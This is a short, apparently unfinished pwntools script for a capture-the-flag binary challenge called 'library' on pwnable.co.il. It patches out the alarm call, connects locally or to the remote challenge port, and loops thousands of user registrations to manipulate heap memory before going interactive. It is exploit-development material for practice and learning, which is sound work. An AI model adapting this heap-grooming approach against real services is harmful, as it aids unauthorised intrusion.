#!/usr/bin/env python3
from pwn import * 

context.binary = elf = ELF('./library')
context.log_level = 'DEBUG'

#Nulify alarm function
elf.asm(elf.symbols['alarm'], 'ret')
elf.save('./patched_library')

context.binary = elf = ELF('./patched_library')

if args['REMOTE']:
    io = remote('pwnable.co.il', 9010)
else: 
    io = process([elf.path])
    gdb.attach(io)

def register(username, password): 
    global io 
    io.recvuntil(b'choice: ')
    io.sendline(b'1')
    io.recvuntil(b'Username: ')
    io.sendline(username.encode())
    io.recvuntil(b'Password: ')
    io.sendline(password.encode())
    
for _ in range(2253):
    register('a' * 30, 'a' * 30)
    
io.interactive()

# 0x21000 = 
# 200 * 60 = 